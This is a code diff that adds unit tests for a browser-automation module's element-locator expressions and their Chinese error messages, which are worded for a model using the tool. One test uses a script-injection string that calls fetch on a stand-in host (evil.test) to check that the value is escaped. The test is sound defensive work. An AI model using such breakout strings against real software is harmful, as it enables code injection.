@@ -1,10 +1,16 @@
 import {
   buildDomSnapshotExpression,
   buildElementPointExpression,
+  buildFindByLocatorExpression,
   buildFocusExpression,
   buildVisibilityExpression,
   buildWaitExpression,
   describeTarget,
+  locatorAmbiguousText,
+  locatorErrorText,
+  locatorNotFoundText,
+  locatorStaleHandleText,
+  locatorUnknownHandleText,
 } from "@core/cdp/inspect";
 import { describe, expect, it } from "vitest";
 
@@ -54,6 +60,90 @@ describe("element targets", () => {
 
   it("still accepts a selector for the element point", () => {
     expect(buildElementPointExpression("button.primary")).toContain('"selector":"button.primary"');
+  });
+
+  it("carries nth through to the single-target resolver", () => {
+    // The action path resolves one element: nth picks a position in the ranked
+    // match list (negative counts from the end), so the page sees the number.
+    const expression = buildElementPointExpression({ text: "删除", nth: -1 });
+    expect(expression).toContain('"nth":-1');
+  });
+
+  it("keeps narrowing fields out of the resolver when they are not given", () => {
+    // Old callers send only selector/label/text/role; the serialized target must
+    // not grow keys for features they never asked about. (Quoted JSON keys are
+    // asserted because the surrounding helper code also says "nth".)
+    const expression = buildElementPointExpression({ text: "创建租户" });
+    expect(expression).toContain('"text":"创建租户"');
+    expect(expression).not.toContain('"hasText"');
+    expect(expression).not.toContain('"nth"');
+  });
+});
+
+describe("narrowed find (locator handles)", () => {
+  it("embeds the narrowing fields into the find expression", () => {
+    // Registration passes `first` explicitly: multiple matches are the answer,
+    // not an error, and the default (use) mode is the strict handle path.
+    const expression = buildFindByLocatorExpression(
+      { text: "删除", hasNotText: "B" },
+      { first: true },
+    );
+    expect(expression).toContain('"text":"删除"');
+    expect(expression).toContain('"hasNotText":"B"');
+    expect(expression).toContain('const mode = "first"');
+  });
+
+  it("defaults to the strict use mode", () => {
+    const expression = buildFindByLocatorExpression({ text: "删除" });
+    expect(expression).toContain('const mode = "use"');
+    expect(expression).toContain("const trait = null");
+    expect(expression).toContain("const useNth = null");
+  });
+
+  it("serialises visible and nth narrowing, including negative positions", () => {
+    const expression = buildFindByLocatorExpression({
+      selector: "#list > button",
+      visible: false,
+      nth: -1,
+    });
+    expect(expression).toContain('"visible":false');
+    expect(expression).toContain('"nth":-1');
+  });
+
+  it("runs in use mode with a trait for handle resolution", () => {
+    const expression = buildFindByLocatorExpression({ text: "删除" }, { trait: "删除 C", nth: 1 });
+    expect(expression).toContain('const mode = "use"');
+    expect(expression).toContain('const trait = "删除 C"');
+    expect(expression).toContain("const useNth = 1");
+  });
+
+  it("keeps a narrowing substring from breaking out of the expression", () => {
+    const nasty = `"); fetch("http://evil.test"); ("`;
+    const expression = buildFindByLocatorExpression({ text: "x", hasText: nasty });
+    expect(expression).not.toContain(nasty);
+    expect(expression).toContain(JSON.stringify(nasty).slice(1, -1));
+  });
+
+  it("words the not-found and ambiguous errors as next actions", () => {
+    // The wording is the contract: a model reading「匹配 N 个」must learn that
+    // nth or a narrowing field is the way forward, not that the page is broken.
+    expect(locatorNotFoundText("文本「删除」")).toContain("找不到");
+    const ambiguous = locatorAmbiguousText("文本「删除」", 3);
+    expect(ambiguous).toContain("匹配 3 个");
+    expect(ambiguous).toContain("nth");
+    expect(ambiguous).toContain("hasText");
+    const outOfRange = locatorErrorText("nth-out-of-range", "文本「删除」", 2, 5);
+    expect(outOfRange).toContain("nth=5");
+    expect(outOfRange).toContain("2");
+  });
+
+  it("distinguishes a stale handle from an unknown one", () => {
+    // After a navigation the fix is "find again"; a never-valid id means the
+    // arguments are wrong. The two messages must not be interchangeable.
+    expect(locatorStaleHandleText("el-1-ab12")).toContain("重新 find");
+    const unknown = locatorUnknownHandleText("el-1-ab12");
+    expect(unknown).toContain("句柄不存在");
+    expect(unknown).toContain("find_browser_element");
   });
 });
 
